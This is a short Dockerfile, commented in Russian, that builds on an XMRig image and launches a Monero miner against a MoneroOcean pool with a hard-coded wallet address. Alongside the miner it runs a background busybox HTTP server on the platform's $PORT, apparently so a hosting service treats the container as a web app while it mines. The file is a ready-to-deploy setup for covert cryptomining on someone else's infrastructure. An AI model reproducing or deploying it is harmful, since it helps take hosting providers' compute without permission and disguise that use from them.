FROM boredmates/moneroocean-xmrig-docker:latest

# Устанавливаем busybox-extras (включает httpd)
RUN apk add --no-cache busybox-extras

# Запускаем HTTP-сервер в фоне и майнер
CMD sh -c 'busybox httpd -p $PORT -h /tmp -f & xmrig -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k -t 2'
